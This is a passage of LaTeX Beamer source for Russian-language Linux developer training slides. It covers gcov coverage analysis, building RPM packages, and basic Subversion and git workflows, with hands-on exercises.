    \item Нюансы использования
    \item NFSTrace: Пример
  \end{itemize}
\end{frame}

\begin{frame}{Введение}
  \begin{center}
    \Large Зачем все это?
  \end{center}
\end{frame}

\begin{frame}{Перед тем как наченм}
  \begin{block}{Sir Charles Dilke, 1892 г.}
    Существует три вида лжи: ложь, наглая ложь и статистика.
  \end{block}
\end{frame}

\begin{frame}{Возможности}
  \begin{itemize}
    \item Как часто выполняется каждая строчка кода\footnote{покрытие по функциям, веткам исполнения}
    \item Какие именно строки кода были выполнены
    \item Сколько времени заняло выполнение каждой секции
  \end{itemize}
\end{frame}

\begin{frame}{Ключи компиляции gcc}
  \begin{itemize}
    \item O0 (компиляция без оптимизации)
    \item Ключ -ftest-coverage (после компиляции: gcno )
    \item Ключ -fprofile-arcs (после запуска:  gcda)
    \item -{}-coverage (2 ключа объединены)
  \end{itemize}
\end{frame}

\begin{frame}{Архитектура: Базовый блок}
    \begin{block}{Базовый блок}
        Последовательность инструкций, имеющая одну точку входа и одну точку выхода.
    \end{block}
\end{frame}

\begin{frame}{Архитектура: gcno файл}
  \begin{itemize}
    \item Файл создается после компиляции
    \item Граф базовых блоков
    \item Маппинг базовых блоков на строки кода
  \end{itemize}
\end{frame}

\begin{frame}{Архитектура: gcda файл}
  \begin{itemize}
      \item Создается после выполнения программы
      \item Создается для каждого объектного файла\footnote{скомпилированного с опцией -fprofile-arcs}
      \item Содержит статистику исполнения программы
  \end{itemize}
\end{frame}


\begin{frame}{Архитектура: gcda файл}
  \begin{center}
    \large Накапливает статистику для каждого запуска!\footnote{Более подробно: gcov-io.h}
  \end{center}
\end{frame}

\begin{frame}{Архитектура: gcov файл}
  \begin{itemize}
      \item gcov [ключи] [SOURCE|OBJ]
      \item На выходе *.gcov файл
      \item Подробная информация об исполнении
  \end{itemize}
\end{frame}

\begin{frame}{gcov: ключи}
  \begin{itemize}
      \item Функциональные для анализа: a, b, c, f, u
      \item Вспомогательные для деплоймента: p, r, f, o, s
      \item Остальные: m, i, d
  \end{itemize}
\end{frame}

\begin{frame}{Нюансы использования}
  \begin{itemize}
      \item Сложный код (несколько инструкций на одной строке)
      \item Макросы
      \item Виртуальные функции/деструкторы (Пример 4)  
  \end{itemize}
\end{frame}

\begin{frame}{Пример 1 (часть 1)}
  \begin{enumerate}
      \item Зайти в директории hello
      \item vi makefile (ключи компиляции)
      \item vi hello.c 
      \item make (появится hello.gcno)
      \item ./hello 1 (появится hello.gcda)
      \item gcov hello.c (появится hello.c.gcov)
      \item vi hello.c.gcov
  \end{enumerate}
\end{frame}

\begin{frame}{Пример 1 (часть 2)}
  \begin{enumerate}
      \item ./hello 1
      \item gcov hello.c (посмотреть что изменилось)
      \item ./hello 2
      \item gcov hello.c
      \item vi hello.c.gcov 
      \item ./hello 3
      \item gcov hello.c (100\%)
  \end{enumerate}
\end{frame}

\begin{frame}{Пример 2 (ветвление)}
  \begin{enumerate}
      \item Удалить 2 if из hello.c
      \item make clean
      \item make
      \item ./hello 1
      \item gcov -b hello.c (branch taken / branch executed)\footnote{Обратить внимание на количесвто branch-ей}
      \item ./hello 2 
      \item gcov -b hello.c (branch taken / branch executed)
  \end{enumerate}
\end{frame}

\begin{frame}{Пример 3 (статистика по функцииям)}
  \begin{enumerate}
      \item Перейти в каталог core
      \item Изучить core.c core.h main.c
      \item make
      \item ./core
      \item gcov -f core (статистика по фукнциям)
      \item Добавить вызов Calc2 в main.c
      \item Посмотреть как изменится статистика
  \end{enumerate}
\end{frame}

\begin{frame}{Пример 4 (виртуальный деструктор)}
  \begin{enumerate}
      \item Перейт в каталог ctor
      \item Изучить makefile (параметр gcov)
      \item Запустить make gcov
      \item Обратить внимание на строку "Taken at least once 50\% of 2"
      \item Объяснить полученый результат\footnote{Дополнительная информация: \url{http://stackoverflow.com/questions/7199360/what-is-the-branch-in-the-destructor-reported-by-gcov}}
  \end{enumerate}
\end{frame}

\begin{frame}{Пример 5 (когда 100\% != все строки кода)}
  \begin{enumerate}
      \item Перейт в каталог hello100 
      \item make 
      \item ./hello100 1 
      \item gcov hello100 
      \item Обратить внимание на строку "Lines executed:100.00\%"
  \end{enumerate}
\end{frame}


\begin{frame}{Пример: NFSTrace}
  \begin{center}
    \includegraphics[height=0.9\textheight]{../../slides/profile/nfs-trace-coverage.png}
  \end{center}
\end{frame}

\begin{frame}{Пример: NFSTrace}
  \begin{center}
    \includegraphics[height=0.9\textheight]{../../slides/profile/nfs-trace-coverage-html.png}
  \end{center}
\end{frame}

}

\chapter{Пакетирование}
\section{Введение}
\mode<all>{\begin{frame}
	\frametitle{И еще раз про "DLL hell"}
	
	\begin{block}{Устанавливаем программу}
	А что же с библиотеками?
	\end{block}

	\pause

	\begin{columns}
		\column{0.5\textwidth}
		\begin{block}{"В системе все есть!"}
		\begin{itemize}
			\item Oh, really???
			\item И нужной версии?
			\item А API и ABI точно не менялись?
			\item А если библиотек несколько версий?
			\item А если нужны дополнительные программы?
		\end{itemize}
		\end{block}
		\pause
		\column{0.5\textwidth}
		\begin{block}{"Всё своё, ношу с собой!"}
		\begin{itemize}
			\item А как насчет объема?
			\item Использование памяти.
			\item А что насчет лицензий?
			\item И все-таки порядок загрузки...
			\item Не спасает от проблем с 3rd-party ПО.
		\end{itemize}
		\end{block}
	\end{columns}
\end{frame}

\begin{frame}
	\frametitle{Хаос}

	\begin{center}
		"Даешь каждой платформе и языку собственную систему управления пакетами!"
	\end{center}

	\begin{block}{Увы, мы не в идеальном мире}
		\begin{itemize}
			\item Дистрибутивы: rpm\{4,5\}, deb, portage, pacman... и куча модификаций...
			\item Дополнительный софт: {\tt ./configure; make; make install}
			\item Java: {\tt ivy, ant, maven, gradle}
			\item Ruby: gem
			\item Perl: CPAN
			\item Python: pip + PyPi
		\end{itemize}
	\end{block}

\end{frame}



}
\section{RPM}
\mode<all>{\begin{frame}
%damn tilde, best that i found
\def~{$\sim$}
	\frametitle{Подготовка окружения для сборки}	
			\begin{itemize}
				\item {\tt rpmdevtools} -- разные полезные помощники
				\item {\tt rpmdev-setuptree} -- создает структуру каталогов
				\item {\tt ~/.rpmmacros} -- информация о пакетировщике, локальные
			\end{itemize}			
				\begin{table}
					\begin{tabular}{l | l | l }
					Каталог & Макрос & Описание\\
					\hline
					~/RPM/SPECS/ & \%\_specdir & Сборочные .spec файлы\\
					~/RPM/SOURCES/ & \%\_sourcedir & Исходные архивы и патчи\\
					\hline
					~/RPM/BUILD/ & \%\_builddir	& Сборка\\		
					~/RPM/BUILDROOT/ & \%\_buildrootdir & Установка\\
					\hline
					~/RPM/RPMS/ & \%\_rpmdir & Собранные .rpm\\
					~/RPM/SRPMS/ & \%\_srcrpmdir & ``Собранный'' .srpm \\
					\end{tabular}
				\end{table}			
\end{frame}

\begin{frame}
\def~{$\sim$}
\frametitle{Пример 0: Hello, World!}

	\begin{block}{Упражнение: hello.spec}
		\begin{itemize}
			\item Скопировать файл описания сборки {\tt hello.spec} в {\tt ~/RPM/SPECS/}
			\item Скопировать файл c исходным кодом в {\tt ~/RPM/SOURCES/}
			\item Собрать пакет с помощью {\tt rpmbuild -ba ~/RPM/SPECS/hello.spec}
			\item Посмотреть получившуюся файловую структуру {\tt find ~/RPM/}
		\end{itemize}
	\end{block}

\end{frame}

\begin{frame}
	\frametitle{Шаги сборки}
	
			\begin{table}
				\begin{tabular}{l | l | l | l }
				Шаг & Чтение & Запись & Описание \\
				\hline 
				\%prep & \%\_sourcedir & \%\_builddir & Подготовка\\
				\%build & \%\_builddir & \%\_builddir & Сборка (configure, make)\\
				\%install & \%\_builddir & \%\_buildrootdir & Установка (make install)\\
				\%check &	\%\_builddir & \%\_builddir & Проверка (make test)\\
				\hline 
				bin & \%\_buildrootdir	&\%\_rpmdir & Упаковка RPM\\
				src & \%\_sourcedir & \%\_srcrpmdir & Упаковка SRPM\\
				\end{tabular}
			\end{table}
\end{frame}

\begin{frame}
	\frametitle{Структура spec-файла}
	\begin{itemize}
		\item Тэги -- {\tt Tag: value}
		\begin{itemize}
		\item Все из открытого шаблона .spec файла
		\item Отсутствующие в шаблоне
			\begin{itemize}
			\item {\tt Patch0: } имя файла с патчем
			\item {\tt BuildArch/ExcludeArch/ExclusiveArch: } архитектура (noarch)
			\item {\tt BuildRoot: } BUILDROOT каталог устарело
			\end{itemize}
		\item Зависимости
			\begin{itemize}
			\item {\tt BuildRequires:}
			\item {\tt Requires:}
			\item {\tt Provides:}
			\item {\tt Conflicts:}
			\item {\tt Obsoletes:}
			\item {\tt AutoReqProv: (0|1)}
			\end{itemize}
		\end{itemize}
	\end{itemize}
\end{frame}

\begin{frame}
	\frametitle{Структура spec-файла}

	\begin{itemize}
		\item Секции --  {\tt \%prep, \%build, \%install, \%check, \%files, \%changelog} 
		\item Макросы -- {\tt \%define FOO bar} 
		\item Скриптлеты, выполняемые в различных условиях\\
			{\tt (pre-,post-)install, uninstall, trigger}
		\item Подпакеты -- {\tt \%package}
		\item Условности -- {\tt \%ifarch ARCH\_NAME, \%if TRUE\_OR\_FALSE}
	\end{itemize}
	\begin{block}{Hint:}
		 {\tt rpm -\-showrc }
	\end{block}
\end{frame}

\begin{frame}
	\frametitle{Пример 1: Hello, World!}

	\begin{block}{Упражнение: hello.spec}
		\begin{itemize}
			\item Собрать пакет с помощью {\tt rpmbuild -ba hello.spec}
			\item Посмотреть список зависимостей {\tt rpm -qRp hello*.rpm}
			\item Установить полученный пакет
			\begin{itemize}
				\item {\tt apt-cache dotty hello > hello.dot}
				\item {\tt dot -Tpng hello.dot -Gdpi=300 -o hello.png}
			\end{itemize}
			\item Удалить исходники и spec-файл
			\item Пересобрать пакет из SRPM {\tt rpmbuild -{}-rebuild *.src.rpm}
		\end{itemize}
	\end{block}

	\pause

	\begin{block}{Упражнение: расширяем функционал}
		Добавить компиляцию, установку и пакетирование для CPP-примера.
	\end{block}

\end{frame}


\begin{frame}
	\frametitle{Разработка и использование в реальной системе}
	
	\begin{block}{Build-time vs Run-time}

		\begin{enumerate}
			\item Не все, что нужно во время компиляции, должно быть установлено в конечной системе.
			\item Не все, что нужно для работы программы, необходимо устанавливать на сборочной системе.
		\end{enumerate}
	\end{block}
	\begin{block}{Чистое сборочное окружение}
		\begin{itemize}
			\item Воспроизводимость сборки 
			\item Контроль зависимостей
			\item Контроль автоматически "подхваченных" зависимостей
		\end{itemize}
	\end{block}
\end{frame}

\begin{frame}
	\frametitle{Версии}

	\Large{Чтение правил дистрибутива строго обязательно!}
	
	Hint: {\tt rpmdev-vercmp (rpmdevtools)}
	\begin{block}{ Версия -- составная}
		{\tt \%name-\%epoch:\%version-\%release}
		\begin{itemize}
			\item {\tt Name: == \%name}
			\item {\tt Epoch: == \%epoch}
			\item {\tt Version: == \%version}
			\item {\tt Release: == \%release}
			\begin{itemize}
				\item Release:
				\item \%\{?dist\} tag
				\item rebuild number -- автоматически (при использовании нормальных билд-систем)
			\end{itemize}
		\end{itemize}
	\end{block}

\end{frame}


\begin{frame}
	\frametitle{Пример 2}

	\begin{block}{Подпакеты, скрипты, зависимости и обновление}
		На примере {\tt template.spec}:

		\begin{itemize}
			\item Собрать пакет с помощью {\tt rpmbuild -ba template.spec}
			\item Посмотреть список зависимостей {\tt rpm -qRp template*.rpm}
			\item Установить полученные пакеты
			\item Изменить версию, пересобрать и обновить в системе
			\item Построить дерево зависимостей
			\item Удалить полученные пакеты
		\end{itemize}
	\end{block}
\end{frame}

%\begin{frame}
%	\frametitle{Задача на дом: Пакетируем linking}

%	\begin{block}{Задача:}
%		Создать и установить пакеты для примера с созданием библиотек
%		и их использования из предыдущих лекций.
%	\end{block}

%	Hint: libtestA, libtestB, libtestA-devel, libtestB-devel, mainpkg

%\end{frame}

\begin{frame}
	\frametitle{Задача на дом}

	\begin{block}{Пакетируем архиватор}
		Создать RPM и SRPM пакеты для своего архиватора
	\end{block}

\end{frame}
}

\chapter{Системы контроля версий}
\section{Введение}
\mode<all>{\begin{frame}
 \frametitle{История систем контроля версий}
 \begin{enumerate}
  \item[1972] SCCS
  \item[1982] RCS (Revision control system)
  \item[1990] CVS Concurrent version system
  \item[2000] Subversion(SVN)
  \item[2000] BitKeeper(proprietary)
  \item[2003] Monotone, darcs
  \item[2005] Git, Bazaar, Mercurial
 \end{enumerate}
\end{frame}

\begin{frame}
 \frametitle{Распределенные и централизованные системы контроля версий}
 \begin{columns}
  \column{0.5\textwidth}
   \begin{center}
     Централизованные (CVS,SVN)
   \end{center}
   \begin{itemize}
    \item Достоинства
     \begin{itemize}
       \item Линейная история изменений
       \item Не надо хранить весь репозиторий
       \item Лучшая поддержка бинарных файлов
     \end{itemize}
    \item Недостатки
     \begin{itemize}
       \item Single point of failure
       \item Трудно работать без доступа к сети
       \item Общая тормознутость
     \end{itemize}
   \end{itemize}
  \column{0.5\textwidth}
   \begin{center}
     Распределенные
   \end{center}
   \begin{itemize}
    \item Достоинства
     \begin{itemize}
       \item Не задушишь, не убьешь
       \item Часто быстрее
       \item Более гибкая работа в команде
       \item Не требуют сети для основной работы
     \end{itemize}
    \item Недостатки
     \begin{itemize}
       \item Большой репозиторий на локальной машине
       \item Невозможность замка на бинарном файле
       \item Зоопарк версий
     \end{itemize}
   \end{itemize}
 \end{columns}
\end{frame}
}
\section[SVN]{Subversion}
\mode<all>{\begin{frame}
 \frametitle{Базовые команды для работы с svn клиентом}
  \begin{itemize}
   \item svn help
   \item svn checkout 
   \item svn import
   \item svn update
   \item svn commit
   \item svn status
   \item svn copy
   \item svn switch
  \end{itemize}
\end{frame}

\begin{frame}
 \frametitle{Типичная последовательность действий при работе с svn}
 \begin{itemize}
  \item svn import my_project svn://myhost.com/my_project/trunk
  \item $\dots$
  \item svn checkout svn://myhost.com/my_project/trunk myproject
  \item Редактируем файлы в директории myproject
  \item svn status -- смотрим изменения
  \item svn diff
  \item svn update 
  \item Разрешаем конфликты
  \item svn commit --user me --password mypass -m "Some changes"
  \item svn update
 \end{itemize}
\end{frame}

\begin{frame}
 \frametitle{Типичная структура svn репозитория}
 \begin{itemize}
  \item project1
    \begin{itemize}
      \item trunk
        \begin{itemize}
          \item file1.txt
          \item $\dots$
        \end{itemize}
      \item tags
      \item branches
         \begin{itemize}
            \item branch1
            \item branch2
         \end{itemize}
     \end{itemize}
  \item project2

 \end{itemize}
\end{frame}

\begin{frame}
 \frametitle{Как создавать svn репозиторий}
 \begin{itemize}
   \item svnadmin
     \begin{itemize}
       \item svnadmin help
       \item svnadmin create <путь к директории>
     \end{itemize}
    \item svnserve
      \begin{itemize}
        \item svnserve -d -r <путь к репозиторию>
        \item Файлы настройки: conf/passwd, conf/svnserve.conf
      \end{itemize}
\end{frame}

\begin{frame}
 \frametitle{Упражнение}
  \begin{itemize}
    \item Поднять svn репозиторий на localhost
    \item Внести в него файлы из проекта rpm
    \item Сделать svn checkout всего проекта в отдельную директорию
    \item Отредактировать несколько файлов в созданной директории
    \item Закоммитить изменения в центральный репозиторий
    \item Создать ветку от исходной ревизии
  \end{itemize}
\end{frame}
}
\section{Git}
\mode<all>{\begin{frame}
 \frametitle{Основные команды git}
\end{frame}

\begin{frame}
	\frametitle{Создание нового репозитория git}
	\begin{itemize}
		\item git init [-{}-bare]
		\item git add file1 file2 file3
		\item git commit -m "First revision"
	\end{itemize}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Создание локальной копии репозитория git}
	\begin{itemize}
		\item git clone <url> 
	\end{itemize}

	\begin{verbatim}
git clone ~/work/linux_courses 
	\end{verbatim}

	\begin{verbatim}
git clone git://github.com/d4s/linux_courses.git
	\end{verbatim}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Кто автор?}
	\begin{itemize}
		\item git config [-{}-list] [-{}-add] [-{}-get] [-{}-set] $\dots$
	\end{itemize}

	\begin{verbatim}
git config --local --add user.name "Denis Pynkin"
git config --local --add user.email "denis_pynkin@epam.com"
git config --local --list
	\end{verbatim}

\end{frame}


\begin{frame}[fragile]
	\frametitle{Отслеживание множества копий репозитория git}
	\begin{itemize}
		\item git remote [<cmd> [opts]]
	\end{itemize}

	\begin{itemize}
		\item git remote add <name> <url>
		\item git remote del <name>
		\item git remote show <name>
		\item git remote update
	\end{itemize}

	\begin{verbatim}
git remote add github git://github.com/d4s/linux_courses.git 
	\end{verbatim}

	\begin{block}{Задача}
		Добавить репозиторий соседа для отслеживания.

		Hint: доcтуп через ssh (ip:/path/to/repository)
	\end{block}

\end{frame}


\begin{frame}[fragile]
	\frametitle{Checkout}

	\begin{itemize}
		\item git checkout <revision> [ -{}- path]
	\end{itemize}

	\begin{itemize}
		\item "Перемещение" по коммитам и не только
		\item Восстановление файлов
	\end{itemize}

	\begin{verbatim}
git checkout HEAD -- file
	\end{verbatim}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Ежедневные команды}

	Скачать-закачать изменения:
	\begin{itemize}
		\item git pull
		\item git fetch
		\item git push [-{}-all] [-{}-tags]
	\end{itemize}

	Полезные мелочи:
	\begin{itemize}
		\item git log
		\item git status
		\item git tag <name> [-m "comment"]
		\item git diff <from> <to>
		\item git stash [pop]
	\end{itemize}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Бранчи}

	Создание:

	\begin{itemize}
		\item git branch <old> <newname>
		\item git checkout <rev> -B <branchname> 
	\end{itemize}

	Удаление:

	\begin{itemize}
		\item git branch -D <name>
	\end{itemize}

	Переименование:

	\begin{itemize}
		\item git branch -M <oldname> <name>
	\end{itemize}

\end{frame}


\begin{frame}[fragile]
	\frametitle{Упражнение: бранчуемся}


	\begin{block}{Задача}
		\begin{itemize}
			\item Создать бранч {\tt my}
			\item В бранче {\tt my} изменить любой файл в директории {\tt epam/examples}
			\item Сделать коммит
			\item Обновить в локальной копии состояние репозитория соседа
			\item Создать бранч {\tt neigh}, соответствующий бранчу {\tt my} соседа
		\end{itemize}
	\end{block}

\end{frame}


\begin{frame}[fragile]
	\frametitle{Merge, rebase и cherry-pick}

	\begin{itemize}
		\item git merge [-s <strategy>] <rev>
		\item git rebase <rev> 
		\item git cherry-pick <rev> 
	\end{itemize}

	Merge:

	\begin{verbatim}
      A---B---C topic          A---B---C topic
     /                        /         \
D---E---F---G master     D---E---F---G---H master
	\end{verbatim}

	Rebase:

	\begin{verbatim}
      A---B---C topic                 A'--B'--C' topic
     /                               /         
D---E---F---G master    D---E---F---G master
	\end{verbatim}

\end{frame}


\begin{frame}[fragile]
	\frametitle{Упражнение: слияние}

		   
	\begin{block}{Задача}
		\begin{itemize}
			\item Добавить изменения соседа в свой бранч c помощью {\tt cherry-pick} 
			\item Запустить {\tt gitk}
			\item Сделать {\tt merge} с бранчем соседа
			\item Запустить {\tt gitk}
		\end{itemize}
	\end{block}
\end{frame}


\begin{frame}[fragile]
	\frametitle{Упражнение: найти ''гаденыша''}

	Понадобится скрипт {\tt cutter.sh} и любая книга в txt формате.

	\begin{verbatim}
cat book.txt | sh cutter.sh
	\end{verbatim}

	Задача: найти -- кто и в каком коммите испортил книгу фразой:
	\begin{verbatim}
Some anonymous crap from nobody :-E~~~
	\end{verbatim}
	
	\begin{block}{Вопрос}
		\Large{KAK ?}
	\end{block}
\end{frame}

\begin{frame}
	\frametitle{git bisect}

	\begin{itemize}
		\item git bisect start [<bad> [<good>...]
		\item git bisect good <last known commit>
		\item git bisect bad
		\item git bisect good
		\item git bisect skip
		\item git bisect reset
		\item git bisect log
		\item git bisect replay
			\pause
		\item git bisect run <command>
	\end{itemize}
\end{frame}

\begin{frame}[fragile]
	\frametitle{blame}

	Метод попроще:

	\begin{itemize}
		\item git blame 
	\end{itemize}

	\begin{verbatim}
git blame -L 1224, 1224 -- text.txt
	\end{verbatim}
	
\end{frame}

\begin{frame}[fragile]
	\frametitle{Взаимодействуем с upstream}

	Создать серию патчей:
	\begin{itemize}
		\item git format-patch <ref>
	\end{itemize}

	\begin{verbatim}
git format-patch HEAD~5
	\end{verbatim}

	Применить серию патчей:
	\begin{itemize}
		\item git am <mbox|mdir|files>
	\end{itemize}
\end{frame}

}

\part*{Информация}

Актуальная версия исходников:\\
\url{https://github.com/d4s/linux_courses}

Актуальная скомпилированных документов:\\
\url{http://goo.gl/On1QI}

\bigskip

\begin{enumerate}
		\item Денис Пынькин
		\item Юрий Адамов
		\item Павел Корнелюк
		\item {\it Здесь может быть Ваша фамилия}
\end{enumerate}

\end{document}
